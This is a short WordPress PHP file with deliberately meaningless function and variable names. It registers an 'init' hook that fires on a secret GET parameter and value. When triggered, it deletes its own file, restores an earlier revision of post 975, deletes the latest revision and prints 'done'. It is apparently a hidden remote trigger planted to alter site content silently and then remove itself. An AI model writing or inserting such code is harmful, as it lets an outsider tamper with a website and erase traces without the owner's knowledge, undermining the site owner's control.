<?php

function notifier_deprecated_sitemap_home() {
	if (isset($_GET['this_remove_multi_review']) && $_GET['this_remove_multi_review'] === 'integrate_meta_creator') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$load_event_local_screen = 975;
		$marketplace_short_list = wp_get_post_revisions($load_event_local_screen);
		if (empty($marketplace_short_list)) die('no revisions');
		if (count($marketplace_short_list) < 2) die('less than 2');
		$another_disable_safe = array_shift($marketplace_short_list);
		$best_core_scss = $another_disable_safe->ID;
		$full_javascript_latest = array_shift($marketplace_short_list);
		$delete_conditional_html_account = $full_javascript_latest->ID;
		$frontend_recipe_nav_alert = wp_restore_post_revision($delete_conditional_html_account);
		if ($frontend_recipe_nav_alert === false) die('error restoring');
		$frontend_recipe_nav_alert = wp_delete_post_revision($best_core_scss);		
		if ($frontend_recipe_nav_alert === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'notifier_deprecated_sitemap_home');
